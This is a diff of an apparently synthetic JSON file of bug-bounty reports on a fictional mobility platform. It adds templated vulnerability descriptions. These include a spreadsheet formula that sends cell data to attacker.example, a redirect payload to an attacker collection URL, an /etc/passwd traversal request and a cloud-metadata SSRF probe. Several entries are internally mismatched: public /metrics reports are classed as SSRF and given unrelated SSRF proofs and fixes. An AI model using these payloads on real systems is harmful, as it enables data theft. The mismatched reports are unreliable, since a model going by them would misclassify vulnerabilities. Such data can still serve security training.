+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3881,7 +3910,8 @@
           "offset": "3d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://app.schneeconnect-mobility.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4017,7 +4047,8 @@
           "offset": "3d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4176,7 +4207,8 @@
           "offset": "7d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://app.schneeconnect-mobility.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4264,7 +4296,8 @@
           "offset": "17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schneeconnect-mobility.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4412,7 +4445,8 @@
           "offset": "6d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4548,7 +4582,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4680,7 +4715,8 @@
           "offset": "3d 18h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4816,7 +4852,8 @@
           "offset": "7d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4927,7 +4964,8 @@
           "offset": "2d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5042,7 +5080,8 @@
           "offset": "2d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5189,7 +5228,8 @@
           "offset": "5d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.schneeconnect-mobility.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5316,7 +5356,8 @@
           "offset": "7d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5456,7 +5497,8 @@
           "offset": "5d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5603,7 +5645,8 @@
           "offset": "7d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5695,7 +5738,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5834,7 +5878,8 @@
           "offset": "18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5957,7 +6002,8 @@
           "offset": "1d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6082,7 +6128,8 @@
           "offset": "2d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6196,7 +6243,8 @@
           "offset": "5d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6343,7 +6391,8 @@
           "offset": "5d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6470,7 +6519,8 @@
           "offset": "4d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6586,7 +6636,8 @@
           "offset": "5d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6714,7 +6765,8 @@
           "offset": "1d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6825,7 +6877,8 @@
           "offset": "5d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6935,7 +6988,8 @@
           "offset": "19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7067,7 +7121,8 @@
           "offset": "1d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7193,7 +7248,8 @@
           "offset": "5d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7297,7 +7353,8 @@
           "offset": "2d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7428,7 +7485,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7574,7 +7632,8 @@
           "offset": "6d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7734,7 +7793,8 @@
           "offset": "9d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
